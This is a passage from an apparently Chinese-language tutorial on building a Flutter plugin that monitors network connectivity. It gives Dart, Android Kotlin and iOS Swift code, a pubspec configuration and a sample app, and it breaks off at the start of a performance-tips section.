      <span class="hljs-keyword">await</span> _methodChannel.invokeMethod(<span class="hljs-string">'initialize'</span>);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'初始化插件失败: <span class="hljs-subst">${e.message}</span>'</span>);
    }
  }
  
  <span class="hljs-comment">/// <span class="markdown">释放资源</span></span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; dispose() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> _methodChannel.invokeMethod(<span class="hljs-string">'dispose'</span>);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'释放插件资源失败: <span class="hljs-subst">${e.message}</span>'</span>);
    }
  }
}
</code></pre>
<h5 data-id="heading-30">第三步：实现Android端代码</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// android/src/main/kotlin/com/xxxx/flutter_network_plugin/FlutterNetworkPlugin.kt</span>
<span class="hljs-keyword">package</span> com.example.flutter_network_plugin

<span class="hljs-keyword">import</span> android.content.Context
<span class="hljs-keyword">import</span> android.net.ConnectivityManager
<span class="hljs-keyword">import</span> android.net.Network
<span class="hljs-keyword">import</span> android.net.NetworkCapabilities
<span class="hljs-keyword">import</span> android.net.NetworkRequest
<span class="hljs-keyword">import</span> android.os.Build
<span class="hljs-keyword">import</span> androidx.<span class="hljs-keyword">annotation</span>.RequiresApi
<span class="hljs-keyword">import</span> io.flutter.embedding.engine.plugins.FlutterPlugin
<span class="hljs-keyword">import</span> io.flutter.plugin.common.EventChannel
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodCall
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodChannel
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodChannel.MethodCallHandler
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodChannel.Result

<span class="hljs-comment">/** FlutterNetworkPlugin */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FlutterNetworkPlugin</span> : <span class="hljs-type">FlutterPlugin</span>, <span class="hljs-type">MethodCallHandler</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> context: Context
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> methodChannel: MethodChannel
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> eventChannel: EventChannel
    
    <span class="hljs-comment">// 事件发送器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> eventSink: EventChannel.EventSink? = <span class="hljs-literal">null</span>
    
    <span class="hljs-comment">// 网络相关</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> connectivityManager: ConnectivityManager? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> networkCallback: ConnectivityManager.NetworkCallback? = <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onAttachedToEngine</span><span class="hljs-params">(flutterPluginBinding: <span class="hljs-type">FlutterPlugin</span>.<span class="hljs-type">FlutterPluginBinding</span>)</span></span> {
        context = flutterPluginBinding.applicationContext
        methodChannel = MethodChannel(
            flutterPluginBinding.binaryMessenger,
            <span class="hljs-string">"flutter_network_plugin/method"</span>
        )
        methodChannel.setMethodCallHandler(<span class="hljs-keyword">this</span>)
        
        eventChannel = EventChannel(
            flutterPluginBinding.binaryMessenger,
            <span class="hljs-string">"flutter_network_plugin/event"</span>
        )
        eventChannel.setStreamHandler(<span class="hljs-keyword">object</span> : EventChannel.StreamHandler {
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onListen</span><span class="hljs-params">(arguments: <span class="hljs-type">Any</span>?, events: <span class="hljs-type">EventChannel</span>.<span class="hljs-type">EventSink</span>?)</span></span> {
                eventSink = events
                <span class="hljs-comment">// 立即发送当前状态</span>
                sendCurrentStatus()
            }
            
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCancel</span><span class="hljs-params">(arguments: <span class="hljs-type">Any</span>?)</span></span> {
                eventSink = <span class="hljs-literal">null</span>
            }
        })
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onDetachedFromEngine</span><span class="hljs-params">(binding: <span class="hljs-type">FlutterPlugin</span>.<span class="hljs-type">FlutterPluginBinding</span>)</span></span> {
        methodChannel.setMethodCallHandler(<span class="hljs-literal">null</span>)
        unregisterNetworkCallback()
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onMethodCall</span><span class="hljs-params">(call: <span class="hljs-type">MethodCall</span>, result: <span class="hljs-type">Result</span>)</span></span> {
        <span class="hljs-keyword">when</span> (call.method) {
            <span class="hljs-string">"getCurrentStatus"</span> -&gt; {
                result.success(getCurrentNetworkStatus())
            }
            <span class="hljs-string">"initialize"</span> -&gt; {
                initializeNetworkMonitoring()
                result.success(<span class="hljs-literal">null</span>)
            }
            <span class="hljs-string">"dispose"</span> -&gt; {
                unregisterNetworkCallback()
                result.success(<span class="hljs-literal">null</span>)
            }
            <span class="hljs-keyword">else</span> -&gt; result.notImplemented()
        }
    }
    
    <span class="hljs-comment">/**
     * 获取当前网络状态
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getCurrentNetworkStatus</span><span class="hljs-params">()</span></span>: Map&lt;String, Any&gt; {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) {
            getNetworkStatusModern()
        } <span class="hljs-keyword">else</span> {
            getNetworkStatusLegacy()
        }
    }
    
    <span class="hljs-meta">@RequiresApi(Build.VERSION_CODES.M)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNetworkStatusModern</span><span class="hljs-params">()</span></span>: Map&lt;String, Any&gt; {
        connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE)
                <span class="hljs-keyword">as</span> ConnectivityManager
        
        <span class="hljs-keyword">val</span> activeNetwork = connectivityManager?.activeNetwork
        <span class="hljs-keyword">val</span> networkCapabilities = connectivityManager?.getNetworkCapabilities(activeNetwork)
        
        <span class="hljs-keyword">val</span> isConnected = networkCapabilities != <span class="hljs-literal">null</span> &amp;&amp;
                (networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) ||
                        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_BLUETOOTH) ||
                        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN))
        
        <span class="hljs-keyword">val</span> type = <span class="hljs-keyword">when</span> {
            networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == <span class="hljs-literal">true</span> -&gt; <span class="hljs-string">"wifi"</span>
            networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == <span class="hljs-literal">true</span> -&gt; <span class="hljs-string">"mobile"</span>
            networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == <span class="hljs-literal">true</span> -&gt; <span class="hljs-string">"ethernet"</span>
            networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_BLUETOOTH) == <span class="hljs-literal">true</span> -&gt; <span class="hljs-string">"bluetooth"</span>
            networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == <span class="hljs-literal">true</span> -&gt; <span class="hljs-string">"vpn"</span>
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"none"</span>
        }
        
        <span class="hljs-keyword">return</span> mapOf(
            <span class="hljs-string">"isConnected"</span> to isConnected,
            <span class="hljs-string">"type"</span> to type,
            <span class="hljs-string">"isRoaming"</span> to <span class="hljs-literal">false</span>,
            <span class="hljs-string">"extraInfo"</span> to <span class="hljs-literal">null</span>
        )
    }
    
    <span class="hljs-meta">@Suppress(<span class="hljs-string">"DEPRECATION"</span>)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNetworkStatusLegacy</span><span class="hljs-params">()</span></span>: Map&lt;String, Any&gt; {
        <span class="hljs-keyword">val</span> cm = context.getSystemService(Context.CONNECTIVITY_SERVICE)
                <span class="hljs-keyword">as</span> ConnectivityManager
        
        <span class="hljs-keyword">val</span> activeNetworkInfo = cm.activeNetworkInfo
        <span class="hljs-keyword">val</span> isConnected = activeNetworkInfo?.isConnected == <span class="hljs-literal">true</span>
        <span class="hljs-keyword">val</span> type = <span class="hljs-keyword">when</span> (activeNetworkInfo?.type) {
            ConnectivityManager.TYPE_WIFI -&gt; <span class="hljs-string">"wifi"</span>
            ConnectivityManager.TYPE_MOBILE -&gt; <span class="hljs-string">"mobile"</span>
            ConnectivityManager.TYPE_ETHERNET -&gt; <span class="hljs-string">"ethernet"</span>
            ConnectivityManager.TYPE_BLUETOOTH -&gt; <span class="hljs-string">"bluetooth"</span>
            ConnectivityManager.TYPE_VPN -&gt; <span class="hljs-string">"vpn"</span>
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"none"</span>
        }
        
        <span class="hljs-keyword">return</span> mapOf(
            <span class="hljs-string">"isConnected"</span> to isConnected,
            <span class="hljs-string">"type"</span> to type,
            <span class="hljs-string">"isRoaming"</span> to activeNetworkInfo?.isRoaming ?: <span class="hljs-literal">false</span>,
            <span class="hljs-string">"extraInfo"</span> to activeNetworkInfo?.extraInfo
        )
    }
    
    <span class="hljs-comment">/**
     * 初始化网络监控
     */</span>
    <span class="hljs-meta">@RequiresApi(Build.VERSION_CODES.LOLLIPOP)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">initializeNetworkMonitoring</span><span class="hljs-params">()</span></span> {
        connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE)
                <span class="hljs-keyword">as</span> ConnectivityManager
        
        <span class="hljs-keyword">val</span> networkRequest = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR)
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .addTransportType(NetworkCapabilities.TRANSPORT_ETHERNET)
            .addTransportType(NetworkCapabilities.TRANSPORT_BLUETOOTH)
            .addTransportType(NetworkCapabilities.TRANSPORT_VPN)
            .build()
        
        networkCallback = <span class="hljs-keyword">object</span> : ConnectivityManager.NetworkCallback() {
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onAvailable</span><span class="hljs-params">(network: <span class="hljs-type">Network</span>)</span></span> {
                <span class="hljs-keyword">super</span>.onAvailable(network)
                sendCurrentStatus()
            }
            
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onLost</span><span class="hljs-params">(network: <span class="hljs-type">Network</span>)</span></span> {
                <span class="hljs-keyword">super</span>.onLost(network)
                sendCurrentStatus()
            }
            
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCapabilitiesChanged</span><span class="hljs-params">(
                network: <span class="hljs-type">Network</span>,
                networkCapabilities: <span class="hljs-type">NetworkCapabilities</span>
            )</span></span> {
                <span class="hljs-keyword">super</span>.onCapabilitiesChanged(network, networkCapabilities)
                sendCurrentStatus()
            }
        }
        
        connectivityManager?.registerNetworkCallback(networkRequest, networkCallback!!)
    }
    
    <span class="hljs-comment">/**
     * 取消网络监控
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">unregisterNetworkCallback</span><span class="hljs-params">()</span></span> {
        networkCallback?.let {
            connectivityManager?.unregisterNetworkCallback(it)
            networkCallback = <span class="hljs-literal">null</span>
        }
    }
    
    <span class="hljs-comment">/**
     * 发送当前状态到Dart
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sendCurrentStatus</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> status = getCurrentNetworkStatus()
        eventSink?.success(status)
    }
}
</code></pre>
<h5 data-id="heading-31">第四步：实现iOS端代码</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ios/Classes/FlutterNetworkPlugin.swift</span>
<span class="hljs-keyword">import</span> Flutter
<span class="hljs-keyword">import</span> Foundation
<span class="hljs-keyword">import</span> SystemConfiguration
<span class="hljs-keyword">import</span> Network

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlutterNetworkPlugin</span>: <span class="hljs-title class_">NSObject</span>, <span class="hljs-title class_">FlutterPlugin</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> eventSink: <span class="hljs-type">FlutterEventSink</span>?
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> monitor: <span class="hljs-type">NWPathMonitor</span>?
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"NetworkMonitor"</span>)
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">with</span> <span class="hljs-params">registrar</span>: <span class="hljs-type">FlutterPluginRegistrar</span>) {
        <span class="hljs-keyword">let</span> instance <span class="hljs-operator">=</span> <span class="hljs-type">FlutterNetworkPlugin</span>()
        
        <span class="hljs-comment">// 方法通道</span>
        <span class="hljs-keyword">let</span> methodChannel <span class="hljs-operator">=</span> <span class="hljs-type">FlutterMethodChannel</span>(
            name: <span class="hljs-string">"flutter_network_plugin/method"</span>,
            binaryMessenger: registrar.messenger()
        )
        registrar.addMethodCallDelegate(instance, channel: methodChannel)
        
        <span class="hljs-comment">// 事件通道</span>
        <span class="hljs-keyword">let</span> eventChannel <span class="hljs-operator">=</span> <span class="hljs-type">FlutterEventChannel</span>(
            name: <span class="hljs-string">"flutter_network_plugin/event"</span>,
            binaryMessenger: registrar.messenger()
        )
        eventChannel.setStreamHandler(instance)
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">handle</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">call</span>: <span class="hljs-type">FlutterMethodCall</span>, <span class="hljs-params">result</span>: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">FlutterResult</span>) {
        <span class="hljs-keyword">switch</span> call.method {
        <span class="hljs-keyword">case</span> <span class="hljs-string">"getCurrentStatus"</span>:
            result(getCurrentNetworkStatus())
        <span class="hljs-keyword">case</span> <span class="hljs-string">"initialize"</span>:
            initializeNetworkMonitoring()
            result(<span class="hljs-literal">nil</span>)
        <span class="hljs-keyword">case</span> <span class="hljs-string">"dispose"</span>:
            disposeNetworkMonitoring()
            result(<span class="hljs-literal">nil</span>)
        <span class="hljs-keyword">default</span>:
            result(<span class="hljs-type">FlutterMethodNotImplemented</span>)
        }
    }
    
    <span class="hljs-comment">// 获取当前网络状态</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">getCurrentNetworkStatus</span>() -&gt; [<span class="hljs-type">String</span>: <span class="hljs-keyword">Any</span>] {
        <span class="hljs-keyword">var</span> zeroAddress <span class="hljs-operator">=</span> sockaddr_in()
        zeroAddress.sin_len <span class="hljs-operator">=</span> <span class="hljs-type">UInt8</span>(<span class="hljs-type">MemoryLayout</span>&lt;sockaddr_in&gt;.size)
        zeroAddress.sin_family <span class="hljs-operator">=</span> sa_family_t(<span class="hljs-type">AF_INET</span>)
        
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> defaultRouteReachability <span class="hljs-operator">=</span> <span class="hljs-built_in">withUnsafePointer</span>(to: <span class="hljs-operator">&amp;</span>zeroAddress, {
            <span class="hljs-variable">$0</span>.withMemoryRebound(to: sockaddr.<span class="hljs-keyword">self</span>, capacity: <span class="hljs-number">1</span>) {
                <span class="hljs-type">SCNetworkReachabilityCreateWithAddress</span>(<span class="hljs-literal">nil</span>, <span class="hljs-variable">$0</span>)
            }
        }) <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> [
                <span class="hljs-string">"isConnected"</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"none"</span>,
                <span class="hljs-string">"isRoaming"</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-string">"extraInfo"</span>: <span class="hljs-literal">nil</span>
            ]
        }
        
        <span class="hljs-keyword">var</span> flags: <span class="hljs-type">SCNetworkReachabilityFlags</span> <span class="hljs-operator">=</span> []
        <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span><span class="hljs-type">SCNetworkReachabilityGetFlags</span>(defaultRouteReachability, <span class="hljs-operator">&amp;</span>flags) {
            <span class="hljs-keyword">return</span> [
                <span class="hljs-string">"isConnected"</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"none"</span>,
                <span class="hljs-string">"isRoaming"</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-string">"extraInfo"</span>: <span class="hljs-literal">nil</span>
            ]
        }
        
        <span class="hljs-keyword">let</span> isReachable <span class="hljs-operator">=</span> flags.contains(.reachable)
        <span class="hljs-keyword">let</span> needsConnection <span class="hljs-operator">=</span> flags.contains(.connectionRequired)
        <span class="hljs-keyword">let</span> isConnected <span class="hljs-operator">=</span> isReachable <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-operator">!</span>needsConnection
        
        <span class="hljs-keyword">var</span> type <span class="hljs-operator">=</span> <span class="hljs-string">"none"</span>
        <span class="hljs-keyword">if</span> flags.contains(.isWWAN) {
            type <span class="hljs-operator">=</span> <span class="hljs-string">"mobile"</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> flags.contains(.connectionRequired) {
            <span class="hljs-comment">// 需要连接但不可达</span>
        } <span class="hljs-keyword">else</span> {
            type <span class="hljs-operator">=</span> <span class="hljs-string">"wifi"</span>
        }
        
        <span class="hljs-keyword">return</span> [
            <span class="hljs-string">"isConnected"</span>: isConnected,
            <span class="hljs-string">"type"</span>: type,
            <span class="hljs-string">"isRoaming"</span>: <span class="hljs-literal">false</span>,
            <span class="hljs-string">"extraInfo"</span>: <span class="hljs-literal">nil</span>
        ]
    }
    
    <span class="hljs-comment">// 初始化网络监控</span>
    <span class="hljs-keyword">@available</span>(<span class="hljs-keyword">iOS</span> <span class="hljs-number">12.0</span>, <span class="hljs-operator">*</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initializeNetworkMonitoring</span>() {
        monitor <span class="hljs-operator">=</span> <span class="hljs-type">NWPathMonitor</span>()
        
        monitor<span class="hljs-operator">?</span>.pathUpdateHandler <span class="hljs-operator">=</span> { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] path <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword">self</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">self</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> }
            
            <span class="hljs-keyword">let</span> isConnected <span class="hljs-operator">=</span> path.status <span class="hljs-operator">==</span> .satisfied
            <span class="hljs-keyword">var</span> type <span class="hljs-operator">=</span> <span class="hljs-string">"none"</span>
            
            <span class="hljs-keyword">if</span> path.usesInterfaceType(.wifi) {
                type <span class="hljs-operator">=</span> <span class="hljs-string">"wifi"</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> path.usesInterfaceType(.cellular) {
                type <span class="hljs-operator">=</span> <span class="hljs-string">"mobile"</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> path.usesInterfaceType(.wiredEthernet) {
                type <span class="hljs-operator">=</span> <span class="hljs-string">"ethernet"</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> path.usesInterfaceType(.loopback) {
                type <span class="hljs-operator">=</span> <span class="hljs-string">"loopback"</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> path.usesInterfaceType(.other) {
                type <span class="hljs-operator">=</span> <span class="hljs-string">"other"</span>
            }
            
            <span class="hljs-keyword">let</span> status: [<span class="hljs-type">String</span>: <span class="hljs-keyword">Any</span>] <span class="hljs-operator">=</span> [
                <span class="hljs-string">"isConnected"</span>: isConnected,
                <span class="hljs-string">"type"</span>: type,
                <span class="hljs-string">"isRoaming"</span>: <span class="hljs-literal">false</span>,
                <span class="hljs-string">"extraInfo"</span>: <span class="hljs-literal">nil</span>
            ]
            
            <span class="hljs-comment">// 发送到Dart</span>
            <span class="hljs-type">DispatchQueue</span>.main.async {
                <span class="hljs-keyword">self</span>.eventSink<span class="hljs-operator">?</span>(status)
            }
        }
        
        monitor<span class="hljs-operator">?</span>.start(queue: queue)
    }
    
    <span class="hljs-comment">// 释放网络监控</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">disposeNetworkMonitoring</span>() {
        monitor<span class="hljs-operator">?</span>.cancel()
        monitor <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>
    }
}

<span class="hljs-keyword">extension</span> <span class="hljs-title class_">FlutterNetworkPlugin</span>: <span class="hljs-title class_">FlutterStreamHandler</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">onListen</span>(<span class="hljs-params">withArguments</span> <span class="hljs-params">arguments</span>: <span class="hljs-keyword">Any</span><span class="hljs-operator">?</span>, 
                        <span class="hljs-params">eventSink</span> <span class="hljs-params">events</span>: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">FlutterEventSink</span>) -&gt; <span class="hljs-type">FlutterError</span>? {
        eventSink <span class="hljs-operator">=</span> events
        
        <span class="hljs-comment">// 立即发送当前状态</span>
        <span class="hljs-keyword">let</span> status <span class="hljs-operator">=</span> getCurrentNetworkStatus()
        events(status)
        
        <span class="hljs-comment">// 初始化监控</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">#available</span>(<span class="hljs-keyword">iOS</span> <span class="hljs-number">12.0</span>, <span class="hljs-operator">*</span>) {
            initializeNetworkMonitoring()
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">onCancel</span>(<span class="hljs-params">withArguments</span> <span class="hljs-params">arguments</span>: <span class="hljs-keyword">Any</span><span class="hljs-operator">?</span>) -&gt; <span class="hljs-type">FlutterError</span>? {
        eventSink <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>
        disposeNetworkMonitoring()
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
    }
}
</code></pre>
<h5 data-id="heading-32">第五步：配置插件</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># pubspec.yaml</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">flutter_network_plugin</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">A</span> <span class="hljs-string">Flutter</span> <span class="hljs-string">plugin</span> <span class="hljs-string">for</span> <span class="hljs-string">monitoring</span> <span class="hljs-string">network</span> <span class="hljs-string">status.</span>
<span class="hljs-attr">version:</span> <span class="hljs-number">1.0</span><span class="hljs-number">.0</span>
<span class="hljs-attr">homepage:</span> <span class="hljs-string">https://github.com/xxxx/flutter_network_plugin</span>

<span class="hljs-attr">environment:</span>
  <span class="hljs-attr">sdk:</span> <span class="hljs-string">"&gt;=2.17.0 &lt;3.0.0"</span>
  <span class="hljs-attr">flutter:</span> <span class="hljs-string">"&gt;=1.17.0"</span>

<span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">flutter:</span>
    <span class="hljs-attr">sdk:</span> <span class="hljs-string">flutter</span>

<span class="hljs-attr">dev_dependencies:</span>
  <span class="hljs-attr">flutter_test:</span>
    <span class="hljs-attr">sdk:</span> <span class="hljs-string">flutter</span>

<span class="hljs-attr">flutter:</span>
  <span class="hljs-attr">plugin:</span>
    <span class="hljs-attr">platforms:</span>
      <span class="hljs-attr">android:</span>
        <span class="hljs-attr">package:</span> <span class="hljs-string">com.example.flutter_network_plugin</span>
        <span class="hljs-attr">pluginClass:</span> <span class="hljs-string">FlutterNetworkPlugin</span>
      <span class="hljs-attr">ios:</span>
        <span class="hljs-attr">pluginClass:</span> <span class="hljs-string">FlutterNetworkPlugin</span>
</code></pre>
<h5 data-id="heading-33">第六步：编写使用案例</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// xxxx/lib/main.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_network_plugin/flutter_network_plugin.dart'</span>;

<span class="hljs-keyword">void</span> main() {
  runApp(MyApp());
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _MyAppState createState() =&gt; _MyAppState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_MyAppState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">MyApp</span>&gt; </span>{
  NetworkStatus _currentStatus = NetworkStatus(
    isConnected: <span class="hljs-keyword">false</span>,
    type: NetworkType.unknown,
  );
  StreamSubscription&lt;NetworkStatus&gt;? _subscription;

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _initNetworkPlugin();
  }

  Future&lt;<span class="hljs-keyword">void</span>&gt; _initNetworkPlugin() <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// 初始化插件</span>
    <span class="hljs-keyword">await</span> FlutterNetworkPlugin.initialize();
    
    <span class="hljs-comment">// 获取当前状态</span>
    <span class="hljs-keyword">final</span> status = <span class="hljs-keyword">await</span> FlutterNetworkPlugin.currentStatus;
    setState(() {
      _currentStatus = status;
    });
    
    <span class="hljs-comment">// 监听状态变化</span>
    _subscription = FlutterNetworkPlugin.onStatusChanged.listen((status) {
      setState(() {
        _currentStatus = status;
      });
    });
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _subscription?.cancel();
    FlutterNetworkPlugin.dispose();
    <span class="hljs-keyword">super</span>.dispose();
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> MaterialApp(
      home: Scaffold(
        appBar: AppBar(
          title: Text(<span class="hljs-string">'网络状态插件'</span>),
        ),
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              <span class="hljs-comment">// 连接状态指示器</span>
              Container(
                width: <span class="hljs-number">100</span>,
                height: <span class="hljs-number">100</span>,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: _currentStatus.isConnected ? Colors.green : Colors.red,
                ),
                child: Icon(
                  _currentStatus.isConnected ? Icons.wifi : Icons.wifi_off,
                  size: <span class="hljs-number">50</span>,
                  color: Colors.white,
                ),
              ),
              SizedBox(height: <span class="hljs-number">20</span>),
              <span class="hljs-comment">// 状态信息</span>
              Text(
                _currentStatus.isConnected ? <span class="hljs-string">'已连接'</span> : <span class="hljs-string">'未连接'</span>,
                style: TextStyle(
                  fontSize: <span class="hljs-number">24</span>,
                  fontWeight: FontWeight.bold,
                ),
              ),
              SizedBox(height: <span class="hljs-number">10</span>),
              Text(
                <span class="hljs-string">'网络类型: <span class="hljs-subst">${_currentStatus.type.toString().split(<span class="hljs-string">'.'</span>).last}</span>'</span>,
                style: TextStyle(fontSize: <span class="hljs-number">18</span>),
              ),
              <span class="hljs-keyword">if</span> (_currentStatus.subtype != <span class="hljs-keyword">null</span>)
                Text(
                  <span class="hljs-string">'子类型: <span class="hljs-subst">${_currentStatus.subtype}</span>'</span>,
                  style: TextStyle(fontSize: <span class="hljs-number">16</span>),
                ),
              SizedBox(height: <span class="hljs-number">30</span>),
              <span class="hljs-comment">// 刷新按钮</span>
              ElevatedButton(
                onPressed: () <span class="hljs-keyword">async</span> {
                  <span class="hljs-keyword">final</span> status = <span class="hljs-keyword">await</span> FlutterNetworkPlugin.currentStatus;
                  setState(() {
                    _currentStatus = status;
                  });
                },
                child: Text(<span class="hljs-string">'刷新状态'</span>),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
</code></pre>
<h3 data-id="heading-34">六、优化</h3>
<h4 data-id="heading-35">6.1 性能优化技巧</h4>
<h5 data-id="heading-36">1. 减少跨平台调用次数</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 不推荐：多次调用</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; saveUser(User user) <span class="hljs-keyword">async</span> {
